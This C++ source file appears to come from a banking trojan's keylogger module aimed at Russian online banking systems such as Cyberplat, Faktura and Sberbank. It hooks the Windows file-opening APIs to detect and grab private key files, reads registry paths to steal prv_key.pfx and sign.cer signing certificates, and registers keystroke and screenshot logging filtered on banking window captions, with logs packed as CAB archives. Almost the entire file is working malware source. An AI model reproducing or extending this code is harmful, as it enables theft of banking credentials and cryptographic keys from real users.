// ---------------------------------------------------------------------------
#include <windows.h>

#include "GetApi.h"
#include "KeyLogSystems.h"
#include "Memory.h"
#include "Utils.h"
#include "Splice.h"

#include "Modules.h"

#include "InistWeb.cpp"
#include "FakturaWeb.cpp"
#include "AvangardWeb.cpp"

#include "BSSWeb.cpp"


//#include "BotDebug.h"

namespace KEYLOGSYSTEMS
{
	#include "DbgTemplates.h"
}

#define DBG KEYLOGSYSTEMS::DBGOutMessage<>

#ifdef SBERH
	#include "SberKeyLogger.h"
#endif

// ---------------------------------------------------------------------------


// ---------------------------------------------------------------------------

namespace Cyberplat
{
	typedef int (WINAPI *PConnect)(SOCKET s, const struct sockaddr *name, int namelen);
	typedef HANDLE (WINAPI *PCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess,
										  DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
										  DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes,
										  HANDLE hTemplateFile);
	typedef HANDLE (WINAPI *PCreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess,
										  DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
										  DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes,
										  HANDLE hTemplateFile);

	#define Hash_CreateFileW 0x8F8F102
	#define Hash_CreateFileA 0x8F8F114
	// ���������� ��� �������� ��������� �� �������� �������
	PCreateFileW Real_CreateFileW = 0;
	PCreateFileA Real_CreateFileA = 0;

	//true - ���� ���� �������� ������ ������
	bool IsFileKey( HANDLE file )
	{
		if (file == INVALID_HANDLE_VALUE)
			return false;

		// ��������� ������ �����. ������� ����� ����������.
		DWORD h;
		DWORD fileSize = (DWORD)pGetFileSize( file, &h );
		if( fileSize < 400 || fileSize > 3000 )
        	return false;

		//  ������ ���� ������
		char* buf = (char*)MemAlloc(fileSize + 1);
		if (buf == NULL)
			return false;

		DWORD size = 0;
        pReadFile( file, buf, fileSize, &size, NULL ); //������ ���� ���� � ������
		bool res = false;
		if( *buf >= '0' && *buf <= '9' )  //� ������ ����� ������ ���� �����
		{
			buf[fileSize] = 0; //����� ������
			//���� ���� BEGIN .... END, ���� ����, �� ��� ���� ������
			char* p = m_strstr( buf, "BEGIN" );
			if( p )
			{
				p = m_strstr( p, "END" ); //����� BEGIN ������ ���� END
				if( p ) 
				{
					res = true;
					//�������� � �������
					KeyLogger::AddFile( 0, "KeyFile", buf, fileSize );
				}
			}
		}

		MemFree(buf);
		// ��������������� ������� �������
		pSetFilePointer( file, 0, 0, FILE_BEGIN );
		return res;
	}

    HANDLE WINAPI Hook_CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
	{
		HANDLE file = Real_CreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
		if( dwDesiredAccess & GENERIC_READ )
		{
			if( lpFileName[0] != '/' ) //���������� ������ ����� � �����
			{
				//DBG("Cyberplat", "Name file(W) %ls", lpFileName );
				if( IsFileKey(file) )
				{
					DBG("Cyberplat", "Key file(W) %ls", lpFileName );
				}
			}
		}
		return file;
	}

	HANDLE WINAPI Hook_CreateFileA( LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
	{
		HANDLE file = Real_CreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
		if( dwDesiredAccess & GENERIC_READ )
		{
			if( lpFileName[0] != '/' ) //���������� ������ ����� � �����
			{
				//DBG("Cyberplat", "Name file(A) %s", lpFileName );
				if( IsFileKey(file) )
				{
					DBG("Cyberplat", "Key file(A) %s", lpFileName );
				}
			}
		}
		return file;
	}

	void Grabber(LPVOID Sender)
	{
		if( Real_CreateFileW == 0 )
		{
	        // ��� ��������� ����� ������ ��� �� �������� �����
			if (HookApi(DLL_KERNEL32, Hash_CreateFileW, &Hook_CreateFileW) )
			{
				__asm mov [Real_CreateFileW], eax
			}
			if (HookApi(DLL_KERNEL32, Hash_CreateFileA, &Hook_CreateFileA) )
			{
				__asm mov [Real_CreateFileA], eax
			}
		}
		DBG("Cyberplat", "Start");
	}
}

// ---------------------------------------------------------------------------
void FakturaInitialize(LPVOID Sender) {
	// ����� ������������� �������

	// ��� ������������� ������� �������� ��� ����� � ����� ���������
	const static char FukturaKey[] = {
		'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\', 'F', 'T', 'C', '\\', 'S',
		'K', 'S', 'B', '\\', 'K', 'e', 'y', 'S', 't', 'o', 'r', 'a', 'g', 'e', 0
	};
	const static char File1[] = {
		'p', 'r', 'v', '_', 'k', 'e', 'y', '.', 'p', 'f', 'x', 0
	};
	const static char File2[] = {
		's', 'i', 'g', 'n', '.', 'c', 'e', 'r', 0
	};
	const static char InternalPath[] = {
		'K', 'e', 'y', 's', '\\', 0
	};

	// ������ ����� ��������� ����� ������� � ������� ������� �����������
	// ���� �����
	bool FreePath = true;
	PCHAR Path = Registry::GetStringValue(HKEY_CURRENT_USER, (PCHAR)FukturaKey,
		NULL);

	// ���� � ������� ��� ����, �� ������������� ���� �� ���������
	if (Path == NULL) {
		FreePath = false;
		Path = "A:\\";
	}

	// ���������� �������� ����
	PCHAR Slash = NULL;
	PCHAR End = STR::End(Path);
	End--;
	if (*End != '\\')
		Slash = "\\";

	PCHAR F1 = STR::New(3, Path, Slash, (PCHAR)File1);
	PCHAR F2 = STR::New(3, Path, Slash, (PCHAR)File2);

	PCHAR IntF1 = STR::New(2, (PCHAR)InternalPath, (PCHAR)File1);
	PCHAR IntF2 = STR::New(2, (PCHAR)InternalPath, (PCHAR)File2);

	KeyLogger::AddFile(F1, IntF1, NULL, 0);
	KeyLogger::AddFile(F1, IntF2, NULL, 0);

	if (FreePath)
		STR::Free(Path);

	STR::Free(F1);
	STR::Free(F2);
	STR::Free(IntF1);
	STR::Free(IntF2);
}


// ---------------------------------------------------------------------------


void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp)
{
	// ������� ������������ ������� ��������� ������� ���������

	// ��������� ������� raif
	#ifdef RafaH
		Rafa::Init();
	#endif

	//http://www.cyberplat.ru/tech/online/
	//https://portal.cyberplat.ru/cgi-bin/login.cgi

	PKeyLogSystem S = KeyLogger::AddSystem("cyberplatweb", PROCESS_HASH_IE);
	if( S != NULL )
	{
		S->SendLogAsCAB = true;

		S->OnActivate = Cyberplat::Grabber;
		char CyberplatCaption[] = {'�','�','�','�','�','�','�','�','�','�','�','�','�',' ','�','�','�','�','�','�','�','�','�','�','�','�', 0};
		KeyLogger::AddFilter(S, true, true, NULL, (PCHAR)CyberplatCaption, FILTRATE_PARENT_WND, LOG_ALL, 3);
	}


	// ��������� QWidjet
//	S = KeyLogger::AddSystem("qwidget", PROCESS_HASH_IE);
//	if (S != NULL)
//	{
//		char QWidgetClass[] = {'q', 'w', 'i', 'd', 'g', 'e', 't', 0};
//		KeyLogger::AddFilter(S, QWidgetClass, NULL, FILTRATE_PARENT_WND, LOG_ALL, 3);
//	}



	// ������������ ������� ��� ����
	#ifdef SberKeyLoggerH
    	RegisterSberKeyLogger();
	#endif

	// ��������� ������� IFOBS
//	S = KeyLogger::AddSystem("ifobs", PROCESS_HASH_IE);
//	if (S != NULL)
//	{
//		char JavaFrameClass[] = {'S', 'u', 'n', 'A', 'w', 't', 'F', 'r', 'a', 'm', 'e',  0};
//		KeyLogger::AddFilter(S, JavaFrameClass, NULL, FILTRATE_PARENT_WND, LOG_ALL, 4);
//    }


	#ifdef IBankSystemH
        RegisterIBankSystem(hashApp);
	#endif

	#ifdef InistWebModule
		InistWeb::Init();
	#endif

	#ifndef BSSH
		BSSWeb::Init();
	#endif


	// ��������� ������� �������
	#ifdef FakturaWebModule
		FakturaWeb::Init();
	#endif

	#ifdef AvangardWebModule
		AvangardWeb::Init();
	#endif

	#ifdef YandexH
		YandexSearchJpg::Init();
	#endif

	#ifdef CCH
		CC::Init(hashApp);
	#endif
}


//-------------------------------------------------------------
void StartKeyLogger(PCHAR AppName)
{
	//  ������� ������������ ������� ���������
	//	������� ��������� � ��������� ���

   	PKeyLogger P = KeyLogger::Initialize(AppName);

	TKeyLoggerFilterData Data;
	ClearStruct(Data);

	Data.SSWidth = 40;
	Data.SSHeight = 40;

	RegisterAllKeyLoggerSystem(&Data, P->ProcessNameHash);



    KeyLogger::Start();
}
